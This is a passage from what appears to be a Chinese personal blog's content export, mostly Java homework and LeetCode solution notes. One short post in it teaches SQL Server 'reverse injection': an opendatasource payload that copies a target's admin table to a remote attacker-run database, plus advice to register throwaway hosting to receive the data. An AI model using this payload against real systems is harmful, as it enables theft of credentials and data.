freedom and justice"</span>;</span><br><span class="line">s[<span class="number">3</span>]=<span class="string">"I have a dream that my four children will one day live in a nation "</span></span><br><span class="line">+ <span class="string">"where they will not be judged by the color if their skin "</span></span><br><span class="line">+ <span class="string">"but by the content of their character."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">Map&lt;<span class="keyword">String</span>,Integer&gt; statistics = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">StringTokenizer st=<span class="keyword">new</span> StringTokenizer(s[i],<span class="string">",.;:-\" "</span>);</span><br><span class="line"><span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();</span><br><span class="line"><span class="keyword">if</span>(statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">statistics.put(<span class="built_in">key</span>, statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">statistics.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(statistics);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>代码<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> class homework5_7 &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"public,abstract,assert,boolean,break,byte,case,catch,char,class,continue,default,do,double,else,enum,extends,final,finally,float,for,if,implements,import,int,interface,instanceof,long,native,new,package,private,protected,return,short,static,strictfp,super,switch,synchronized,this,throw,throws,transient,try,void,volatile,while"</span>;</span><br><span class="line">        Set &lt;<span class="keyword">String</span>&gt;actionSet = <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(<span class="built_in">str</span>.<span class="built_in">split</span>(<span class="string">","</span>)));</span><br><span class="line">        Map &lt;<span class="keyword">String</span>,Integer&gt;keywords  = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line">        System.out.<span class="built_in">print</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">String</span> s = <span class="string">""</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"TestMap.java"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="built_in">int</span> content;</span><br><span class="line">            <span class="keyword">while</span> ((content = fis.read()) != <span class="number">-1</span>) &#123;</span><br><span class="line">                s += (<span class="built_in">char</span>)content;</span><br><span class="line">            &#125;</span><br><span class="line">            StringTokenizer st = <span class="keyword">new</span> StringTokenizer(s,<span class="string">",; ()&#123;&#125;.="</span>);</span><br><span class="line">            <span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();     </span><br><span class="line"><span class="keyword">if</span>(actionSet.contains(<span class="built_in">key</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(keywords);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fis != <span class="keyword">null</span>)</span><br><span class="line">                    fis.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">new</span>=3, <span class="attribute">static</span>=3, <span class="attribute">void</span>=1, <span class="attribute">import</span>=1, <span class="attribute">public</span>=2, <span class="attribute">this</span>=1, <span class="attribute">for</span>=1, <span class="attribute">while</span>=1, <span class="attribute">class</span>=1, <span class="attribute">if</span>=2, <span class="attribute">int</span>=1&#125;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非递减数列</title>
      <link href="/2019/10/23/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/"/>
      <url>/2019/10/23/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="非递减数列"><a href="#非递减数列" class="headerlink" title="非递减数列"></a>非递减数列</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/non-decreasing-array/submissions/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/non-decreasing-array/submissions/</a></strong></p><hr><blockquote><p>给定一个长度为 n 的整数数组，你的任务是判断在最多改变 1 个元素的情况下，该数组能否变成一个非递减数列。</p></blockquote><p>我们是这样定义一个非递减数列的： 对于数组中所有的 i (1 &lt;= i &lt; n)，满足 array[i] &lt;= array[i + 1]。<br><a id="more"></a><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"><span class="section">输入: [4,2,3]</span></span><br><span class="line"><span class="section">输出: True</span></span><br><span class="line"><span class="section">解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。</span></span><br><span class="line">示例 2:</span><br><span class="line"><span class="section">输入: [4,2,1]</span></span><br><span class="line"><span class="section">输出: False</span></span><br><span class="line"><span class="section">解释: 你不能在只改变一个元素的情况下将其变为非递减数列。</span></span><br><span class="line"><span class="section">说明:  n 的范围为 [1, 10,000]。</span></span><br></pre></td></tr></table></figure></p><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>写这个题的时候脑子昏昏沉沉的，写了半天总是不对，看了下大佬的思路，然后就思路清晰~<br>此题只能改变一次，所以建立一个flag保存改变次数，如果改变次数大于1，直接return False<br>发现nums[i] &gt; nums[i+1]时有两种选择使它变成非递减数列</p><ol><li>nums[i]   = nums[i+1]</li><li>nums[i+1] = nums[i]<br>第一种情况时需要考虑将nums[i] = nums[i+1]后，因为已经判断过nums[i] &gt;= nums[i-1]成立，而nums[i] = nums[i+1]语句运行后，nums[i]变小了，需要再次判断是否nums[i] &gt;= nums[i-1],如果nums[i] &lt; nums[i-1]，则进入第二种情况。<br>第二种情况将nums[i+1] = nums[i]并没有什么特别之处，因为循环是往后运行的，可以检查出是否会有问题</li></ol></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>240 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        tmp  = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i+<span class="number">1</span>]):</span><br><span class="line">                flag -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(flag&lt;<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                k = nums[i]</span><br><span class="line">                <span class="comment">#将nums[i]的值改为nums[i+1]的值</span></span><br><span class="line">                nums[i] = nums[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>] <span class="keyword">and</span> i&gt;=<span class="number">1</span>):</span><br><span class="line">                    nums[i] = k</span><br><span class="line">                <span class="comment">#将nums[i+1]的值改为nums[i]的值</span></span><br><span class="line">                    nums[i+<span class="number">1</span>] = nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><hr><blockquote><p>这个题题解数目较少，python3解法大同小异，找到另一个题解，思路和我的一样，不过写的更清晰</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>236 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">                    nums[<span class="number">0</span>]=nums[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&gt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i+<span class="number">1</span>]=nums[i]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&lt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i]=nums[i<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 非递减数列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两数之和</title>
      <link href="/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum/</a></strong></p><hr><blockquote><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。<br><a id="more"></a><br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例:</span><br><span class="line">给定 nums = <span class="string">[2, 7, 11, 15]</span>, target = <span class="number">9</span></span><br><span class="line">因为 nums<span class="string">[0]</span> + nums<span class="string">[1]</span> = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span></span><br><span class="line">所以返回 <span class="string">[0, 1]</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>首先是最原始，最直接的代码，但是这个代码超时了，<del>但是作为笔记，反思自己的愚蠢/算法不够机智是应该的</del><br>该方法是利用两个for循环，第一个for循环遍历nums的元素，记为number，第二个for循环遍历number之后的元素，记为number0，然后相加检验是否为target，如果是则将两个元素加入answer，然后跳出循环，如果不是，则继续循环。</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>N/A</td><td>N/A</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, num<span class="variable">s:</span> List[<span class="keyword">int</span>], targe<span class="variable">t:</span> <span class="keyword">int</span>) -&gt; List[<span class="keyword">int</span>]:</span><br><span class="line">        answer = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">number</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> number0 in <span class="built_in">range</span>(<span class="keyword">number</span>+<span class="number">1</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span>((nums[<span class="keyword">number</span>]+nums[number0])==target):</span><br><span class="line">                    answer.<span class="keyword">append</span>(<span class="keyword">number</span>)</span><br><span class="line">                    answer.<span class="keyword">append</span>(number0)</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><blockquote><p>之后是从大佬那里看来的思路，利用python3带的in方法，一个for循环遍历nums元素，记为left，利用target-left_index得到的值，记为right，利用in方法检测是否在left之后的列表里，如果在，则把当前遍历元素之后的元素拿出来，检测第一个出现right，然后返回</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>852ms</td><td>14.2MB</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, num<span class="variable">s:</span> List[<span class="keyword">int</span>], targe<span class="variable">t:</span> <span class="keyword">int</span>) -&gt; List[<span class="keyword">int</span>]:</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">left</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">right</span> = target - nums[<span class="keyword">left</span>]</span><br><span class="line">            i = nums[<span class="keyword">left</span>+<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">right</span> in i):</span><br><span class="line">                <span class="keyword">x</span> = i.<span class="built_in">index</span>(<span class="keyword">right</span>)</span><br><span class="line">                <span class="keyword">x</span> = <span class="keyword">x</span> + <span class="keyword">left</span> + <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> [<span class="keyword">left</span>,<span class="keyword">x</span>]</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure><blockquote><p>enumerate产生一个有下标值和对应值的列表，一个一个遍历nums，如果不在字典里，就把target-当前遍历值即当前需要的值加入字典，并解释为当前遍历值的下标，等遍历到需要的那个值，就直接查找是否在字典里，如果在，说明前面遍历时有某个值恰好加上当前遍历的值即为target，取对应的：值即为需要的下标，返回即可</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>68ms</td><td>15MB</td><td>Python3</td></tr></tbody></table><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">twoSum</span>(<span class="title">self</span>, <span class="title">nums</span>: <span class="title">List</span>[<span class="title">int</span>], <span class="title">target</span>: <span class="title">int</span>) -&gt; <span class="title">List</span>[<span class="title">int</span>]:</span></span><br><span class="line"><span class="class">        <span class="title">dic</span> = </span>&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, <span class="built_in">num</span> <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">num</span> <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">return</span> [dic[<span class="built_in">num</span>], i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[target - <span class="built_in">num</span>] = i</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 两数之和 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLSever的反弹注入</title>
      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></p><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数反转</title>
      <link href="/2019/10/14/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/"/>
      <url>/2019/10/14/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/reverse-integer/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/reverse-integer/</a></strong></p><hr><blockquote><p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。<br><a id="more"></a><br>示例 1:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: 123</span></span><br><span class="line"><span class="section">输出: 321</span></span><br></pre></td></tr></table></figure></p></blockquote><p> 示例 2:<br> <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 输入: <span class="string">-123</span></span><br><span class="line">输出: <span class="string">-321</span></span><br></pre></td></tr></table></figure></p><p>示例 3:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: 120</span></span><br><span class="line"><span class="section">输出: 21</span></span><br></pre></td></tr></table></figure></p><blockquote><p>注意:<br>假设我们的环境只能存储得下 32 位的有符号整数，则其数值范围为 [−2^31,  2^31 − 1]。请根据这个假设，如果反转后整数溢出那么就返回 0。</p></blockquote><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>首先是我自己写的代码，很朴素的思想，通用性很差，写了很多的if、else来处理异常状况</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>48 ms</td><td>13.8 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def <span class="built_in">reverse</span>(self, <span class="keyword">x</span>: <span class="keyword">int</span>) -&gt; in<span class="variable">t:</span></span><br><span class="line">        strx = str(<span class="keyword">x</span>)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        length = <span class="built_in">len</span>(strx)</span><br><span class="line">        listx = <span class="keyword">list</span>(strx)</span><br><span class="line">        <span class="keyword">if</span>(listx[<span class="number">0</span>]== <span class="string">"-"</span> <span class="built_in">and</span> length == <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">x</span></span><br><span class="line">        elif((<span class="keyword">x</span>&gt;<span class="number">2147483647</span>) <span class="built_in">or</span> <span class="keyword">x</span>&lt;-<span class="number">2147483648</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        elif(length == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">x</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(listx[<span class="number">0</span>]==<span class="string">"-"</span>):</span><br><span class="line">                listx.<span class="keyword">pop</span>(<span class="number">0</span>)</span><br><span class="line">                length = <span class="built_in">len</span>(listx)</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> <span class="keyword">number</span> in <span class="built_in">range</span>(<span class="keyword">int</span>((length)/<span class="number">2</span>)):</span><br><span class="line">                temp = listx[<span class="keyword">number</span>]</span><br><span class="line">                listx[<span class="keyword">number</span>] = listx[-(<span class="keyword">number</span>+<span class="number">1</span>)]</span><br><span class="line">                listx[-(<span class="keyword">number</span>+<span class="number">1</span>)] = temp</span><br><span class="line">            n = <span class="number">0</span>           </span><br><span class="line">            <span class="keyword">for</span> i,<span class="keyword">number</span> in enumerate(listx):</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">number</span> == <span class="string">"0"</span>):</span><br><span class="line">                    n = n + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> i in <span class="built_in">range</span>(n):</span><br><span class="line">                listx.<span class="keyword">pop</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                listx.<span class="keyword">insert</span>(<span class="number">0</span>,<span class="string">"-"</span>)</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">x</span>=<span class="string">""</span>.<span class="keyword">join</span>(listx)</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">int</span>(<span class="keyword">x</span>)&gt;<span class="number">2147483647</span> <span class="built_in">or</span> <span class="keyword">int</span>(<span class="keyword">x</span>)&lt;-<span class="number">2147483648</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">x</span></span><br></pre></td></tr></table></figure><blockquote><p>算法思路： 为对当前数取对 10的余数，再一项项填入res尾部，即可完成 int 翻转。<br>Python： 存储数字理论上是无限长度，因此每次计算完后判断res与of的大小关系即可；<br>Python的坑： 由于Python的 // 操作是向下取整，导致正负数取余 % 操作结果不一致，因此需要将原数字转为正数操作。<br> 1&lt;&lt;31    = 2147483648<br>(1&lt;&lt;31)-1= 2147483647<br> of = (1 &lt;&lt; 31) - 1 if x &gt; 0 else 1 &lt;&lt; 31<br> 即如果x&gt;0 of = 2147483647 x&lt;0 of = 2147483648<br>| 提交结果 | 执行用时 | 内存消耗 | 语言    |<br>| ——– | ——– | ——– | ——- |<br>| 通过     | 36 ms    | 13.8 MB  | Python3 |<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span 